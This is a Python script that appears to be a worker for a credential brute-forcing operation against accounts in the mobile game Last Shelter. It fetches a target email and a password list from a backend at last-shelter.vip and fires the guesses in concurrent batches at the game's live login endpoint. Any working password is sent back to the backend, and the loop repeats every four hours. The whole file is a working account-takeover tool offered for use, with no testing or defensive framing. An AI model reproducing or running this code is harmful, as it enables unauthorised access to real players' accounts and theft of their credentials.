import asyncio
import os.path
import pickle
import time

import requests
from pydantic import BaseModel, Field

password_data_filename = "passwords.bin"
job_data_filename = "job.bin"


class Job(BaseModel):
    job_id: str
    email: str
    job_completed: bool
    job_in_progress: bool
    file_index: int
    password_found: str | None
    file_progress: int = Field(default=0)


def get_jobs() -> list[Job]:
    auth_code = "sdasdasdas"
    url = f"https://last-shelter.vip/admin/_tool/get-jobs/{auth_code}"
    response = requests.get(url=url)
    return [Job(**_job) for _job in response.json().get('job_list', [])] if response.ok else []


def get_files(job_id: str):
    url = f"https://last-shelter.vip/admin/_tool/get-job/{job_id}"
    response = requests.get(url=url)
    if response.ok:
        return response.json()


async def game_account_valid(password: str, email: str) -> tuple[bool, str]:
    """
    Validate Game Accounts
    :param email: Email of the account
    :param password: Password of the account
    :return: True if the login is successful, False otherwise
    """
    _account_verification_endpoint: str = "https://lsaccount.im30.net/common/v1/login"
    form_data = {'email': email, 'pass': password}
    response = requests.post(url=_account_verification_endpoint, data=form_data)
    if response.ok:
        response_data = response.json()
        return response_data.get('code') == 10000, password
    return False, password


async def validate_passwords(job: Job, passwords: dict[str, str], _email: str) -> tuple[bool, str | None]:
    # Validate passwords concurrently
    password_list = list(passwords.values())

    print(f"Found passwords {len(password_list)}")
    i = job.file_progress
    print(f"starting JOB at {job.file_progress}")
    interval = 5
    update_interval = interval * 50

    while i < len(password_list):
        routines = []
        for _pass in password_list[i: i + interval]:
            routines.append(game_account_valid(password=_pass, email=_email))
        i += 4
        results = await asyncio.gather(*routines)
        if i % update_interval == 0:
            job.file_progress += update_interval
            create_job_file(job=job)

        for _is_found, _pass in results:
            print(_is_found, _pass)
            if _is_found:
                # update_backend(_pass=normal_list[], _job_id=job_id)
                return _is_found, _pass
        print(f"Counter : {i}")
    return False, None


def update_backend(_pass: str, _job_id: str):
    """

    :param _pass:
    :param _job_id:
    :return:
    """
    url = f"https://last-shelter.vip/admin/_tool/updates/{_job_id}/{_pass}"
    response = requests.post(url=url)
    return response.ok


def create_passwords_file(passwords: dict[str, str]):
    # Create an example passwords data dictionary
    # Write the passwords data to the passwords file
    with open(password_data_filename, "wb") as file:
        pickle.dump(passwords_data, file)


def create_job_file(job: Job):
    # Create an example job object
    # Write the job object to the job file
    with open(job_data_filename, "wb") as file:
        pickle.dump(job, file)


def get_new_data():
    global passwords_data, email, job_id, job
    for _job in get_jobs():
        if _job.job_in_progress and not _job.job_completed:
            file_data = get_files(job_id=_job.job_id)
            passwords_data = file_data.get("passwords")

            email = _job.email
            job_id = _job.job_id

            create_job_file(job=_job)
            create_passwords_file(passwords=passwords_data)

            if not job_id:
                continue
            else:
                job = _job
                break
            # create the files above with the data found in this section


if __name__ == "__main__":

    passwords_data = {}
    job: Job | None = None

    if os.path.exists(password_data_filename) and os.path.exists(job_data_filename):
        with open(password_data_filename, "rb") as _file:
            while True:
                try:
                    passwords_data = pickle.load(_file)
                except EOFError:
                    break

        with open(job_data_filename, "rb") as _file:
            job: Job = pickle.load(_file)
            job_id = job.job_id
            email = job.email

    else:
        get_new_data()

    while True:
        is_found, password = asyncio.run(validate_passwords(job=job, passwords=passwords_data, _email=email))

        if is_found:
            _password = {value: key for key, value in passwords_data.items()}[password]
            update_backend(_pass=_password, _job_id=job_id)

        # Update local files
        time.sleep(14400)
        get_new_data()
